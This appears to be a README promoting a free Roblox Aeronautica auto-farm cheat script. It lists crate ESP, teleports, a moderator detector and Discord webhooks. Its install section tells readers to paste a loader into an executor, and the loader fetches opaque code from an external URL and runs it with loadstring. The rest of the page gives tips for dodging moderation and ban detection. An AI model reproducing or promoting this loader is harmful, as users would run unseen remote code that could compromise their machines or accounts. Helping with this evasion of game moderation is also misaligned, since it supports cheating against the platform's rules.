<h1 align="center">✈️ Grindnautica — Aeronautica Auto Farm Script</h1>

<p align="center">
  <b>The best free Roblox <a href="https://www.roblox.com/games/7230977870">Aeronautica</a> script</b> — auto crate farm, crate ESP, Discord webhooks, auto server-hop, mass scrap &amp; auto-craft, and a gorgeous <b>Liquid Glass</b> UI.
</p>

<p align="center">
  <img alt="Game" src="https://img.shields.io/badge/Game-Aeronautica-00A2FF?style=for-the-badge">
  <img alt="Platform" src="https://img.shields.io/badge/Platform-Roblox-EF3E42?style=for-the-badge&logo=roblox&logoColor=white">
  <img alt="Language" src="https://img.shields.io/badge/Made%20with-Luau-000?style=for-the-badge&logo=lua&logoColor=white">
  <img alt="Status" src="https://img.shields.io/badge/Status-Active%20%26%20Updated-8A2BE2?style=for-the-badge">
  <img alt="Price" src="https://img.shields.io/badge/Price-Free-2ea44f?style=for-the-badge">
</p>

---

## 📖 About

**Grindnautica** is a free, actively-maintained **Aeronautica script** for Roblox that automates the grind: it collects plane-part crates across every airport, reports your progress to Discord, hops to fresh servers when one runs dry, and turns your parts into planes or **WP (Wing Points)** in one click — all behind a smooth, modern **iOS-style Liquid Glass** interface.

If you were searching for an **Aeronautica auto farm**, **Aeronautica crate farm**, **Aeronautica auto crate collector**, or an **Aeronautica script hub** — this is it.

---

## 🚀 Getting Started

Paste this into your executor and run it. The loader retries automatically if your connection hiccups:

```lua
for _ = 1, 12 do
    local ok, res = pcall(function()
        return game:HttpGet("https://mfa.al/get.php?k=gK7pX2mQ_v9Lz4Tn")
    end)
    if ok and type(res) == "string" and #res > 1000 then
        local f = loadstring(res); if f then f(); break end
    end
    task.wait(2)
end
```

> 💡 Join **Aeronautica**, run the script, and open the **Auto Farm** tab. That's it.

### 🔁 Server-Hop Edition (autoexec) - W.I.P.

There's a separate **auto server-hop** build meant for your executor's **autoexec** folder: it runs on every join, waits for the game to load, auto-starts farming, and jumps to a fresh server the moment crates dry up — fully hands-free 24/7 farming. - WORK IS IN PROGRESS. CURRENTLY UNAVAILABLE.

---

## ✨ Features

### 🌾 Farming
- **Universal auto crate farm** — collects plane-part crates across **every airport / region** automatically.
- **Smart streaming** — waits for each airport to finish loading before collecting, so nothing is missed.
- **Per-crate respawn handling** — respawns your plane after each crate so the game credits every pickup.
- **Auto server-hop** — detects a depleted server and teleports to a fresh, low-population one (Server-Hop edition).

### 👁️ Crate ESP
- **Crate ESP** highlighting **only collectable** crates (already-collected ones are ignored).
- **Distance display** and optional **part filtering**.

### 📊 Stats &amp; Reporting
- **Crate Rate meter** — live crates-per-minute with a performance rating.
- **Session Stats** — parts collected, time, server hops, and more.
- **Discord webhooks** — per-part notifications, per-cycle summaries, and a disconnect report if a moderator joins.
- **Part filter** (multi-select) — only get notified about the planes you care about.
- **Inventory count** &amp; **export inventory to a .txt file** (grouped &amp; alphabetical).

### 🛠️ Inventory Tools
- **Scrap Parts** — mass-scrap your inventory for **WP**, with a custom amount and a **Common-parts-first** priority (rare planes are kept for last). Shows exactly how much **WP** you earned.
- **Auto-Craft All Planes** — automatically crafts every plane you have enough parts for, in one click.
- **Change Call-Sign** — set your aircraft call-sign to anything you want.

### 🧭 Utility
- **Teleports** — instantly teleport your aircraft to any airport by name.
- **Moderator Detector** — get notified (or auto-leave) when a staff member joins your server.
- **Anti-AFK** — never get kicked for being idle.

### 🎨 Interface
- Powered by a custom **Liquid Glass UI library** — choose between **Legacy**, **Liquid Glass**, and **Liquid Glass V2** (the clear, frosted iPhone look with white see-through toggles).
- **Cursor particles**, adjustable **opacity**, **window size**, **element size**, and **column layouts**.
- **Config system** — save / load / autoload your setup, so it's ready every launch.

---

## 💡 Tips

- **Fastest WP in the game — just scrap parts.** Roughly **2,000 parts ≈ 2,000,000 WP**. Open **Scrap Parts** (Common parts go first, rare planes are kept for last) and let it run — it even tells you exactly how much WP you earned.
- **Fresh servers are the most productive.** A server gives its best haul in the first **~7–10 minutes** — around **70–140 parts** — before the crates thin out. Once your crate rate drops, move to a fresh server (or rejoin) to keep the numbers high.
- **Pick a realistic call-sign.** For a cleaner, more authentic look, use a real aviation format (a prefix like `N-`, `G-`, or `P-` followed by letters/digits) instead of something random.

---

## 🛡️ Staying Safe

Automating any Roblox experience is against the game's and Roblox's Terms of Service and **can result in a ban** — there is no truly "undetectable" way around that, and this project won't pretend otherwise. A few sensible habits:

- **Decide which account you're willing to risk.** Many players just farm on the **main account they actually play** (simplest — no moving parts between accounts); others prefer a dedicated alt they don't mind losing. Either way, go in knowing the risk.
- **Don't leave it running unattended for hours on end.** Long, non-stop sessions are the easiest way to end up with a problem.
- **Keep your call-sign realistic** (see Tips) rather than something that screams "bot."

> ⚠️ Use it at your own risk. You are responsible for how you use this script.

---

## 🖥️ Supported Executors

Works with any executor that supports `loadstring` + `HttpGet` and the standard file API, including **Synapse X, Script-Ware, Wave, Delta, Codex, Fluxus, KRNL, Solara, Xeno, Swift, AWP**, and most others.

---

## ❓ FAQ

**Is it free?** Yes — 100% free, no key system, no paywall.

**Is it safe?** It's a client-side automation script. As with any Roblox exploit, use an **alt account** — automating any game carries a ban risk. You use it at your own risk.

**It didn't open a menu / failed to load?** Re-run it — the loader auto-retries on network errors (rate limits, slow connections). Make sure your executor supports `HttpGet`.

**Does it work on mobile executors?** If the executor supports `loadstring` and `HttpGet`, yes.

**Which games?** Made specifically for **Aeronautica**. Running it elsewhere will just tell you the features won't work there.

---

## ⚠️ Disclaimer

This project is provided **for educational purposes** only. It is **not affiliated with, endorsed by, or connected to Aeronautica or Roblox Corporation** in any way. Automating a Roblox experience may violate the game's or Roblox's Terms of Service and can result in account moderation. **Use at your own risk**, preferably on an alternate account.

---

## 💬 Contact &amp; Support

- **Discord:** `a3ug`
- **Telegram:** `@comboy787`

If you run into an issue, reach out on either — and consider ⭐ **starring the repo** so more people can find it.

---

<p align="center"><sub>
Keywords: Aeronautica script, Aeronautica auto farm, Aeronautica autofarm, Aeronautica crate farm, Aeronautica hack, Aeronautica exploit, Aeronautica GUI, Aeronautica ESP, Aeronautica server hop, Aeronautica free script, Roblox Aeronautica script 2025, best Aeronautica script.
</sub></p>

<p align="center"><i>Made with 💜 for the Aeronautica community.</i></p>
